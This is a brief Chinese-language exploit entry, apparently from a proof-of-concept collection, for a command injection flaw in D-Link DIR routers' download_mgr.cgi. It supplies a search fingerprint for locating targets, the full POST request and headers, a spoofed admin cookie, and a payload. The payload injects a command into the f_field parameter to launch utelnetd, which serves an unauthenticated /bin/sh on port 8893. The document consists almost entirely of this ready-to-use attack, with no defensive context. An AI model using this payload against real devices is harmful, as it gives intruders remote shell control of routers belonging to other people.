# D-Linkdownload_mgr.cgi存在命令执行漏洞

- **系统**：D-Linkdownload_mgr.cgi　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"D-Link-DIR"`
- **请求**：`POST /cgi-bin/download_mgr.cgi HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`X-Requested-With: XMLHttpRequest`　`Content-Length: 66`　`Cookie: username=admin`　`Priority: u=0`

**请求体 / payload**
```
cmd=RSS_Get_Update_Status&f_field=;utelnetd -p 8893 -l /bin/sh;
```
- **预期**：200　|　—